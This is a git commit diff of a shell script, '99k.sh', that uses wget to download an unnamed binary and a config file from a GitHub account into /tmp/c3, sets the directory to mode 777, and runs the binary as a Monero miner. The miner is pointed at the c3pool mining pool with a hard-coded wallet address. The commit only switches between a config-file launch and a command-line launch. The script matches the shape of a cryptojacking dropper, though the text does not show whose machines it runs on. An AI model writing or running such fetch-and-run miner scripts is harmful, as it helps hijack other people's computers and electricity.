84e7c6e5ebbea8e4f187bdb531787fbbf0ceb368
Blenkinship <151480121+Blenkinship@users.noreply.github.com>
2023-12-09 12:24:18 +0800

    Update 99k.sh

--- 99k.sh
+++ 99k.sh
@@ -10,5 +10,5 @@ cd /tmp/c3
 wget https://raw.githubusercontent.com/Blenkinship/any/main/32/config.json
 wget https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R  777 /tmp/c3
-##/tmp/c3/0 --config=/tmp/c3/config.json
-/tmp/c3/0 -o auto.c3pool.org:19999 -u 49mZniQ6izgMDGL6xqEipZQ1Mh92KUij3J6bVmCH6FjhAvZWzmCj6AmK6KJc21skfxLDCaBLbd7pAXMXbsLN5zHCTtn7e9x -p qunau2024.Q1Qamz -a rx/0 -k --donate-level 0
+/tmp/c3/0 --config=/tmp/c3/config.json
+##/tmp/c3/0 -o auto.c3pool.org:19999 -u 49mZniQ6izgMDGL6xqEipZQ1Mh92KUij3J6bVmCH6FjhAvZWzmCj6AmK6KJc21skfxLDCaBLbd7pAXMXbsLN5zHCTtn7e9x -p qunau2024.Q1Qamz -a rx/0 -k --donate-level 0
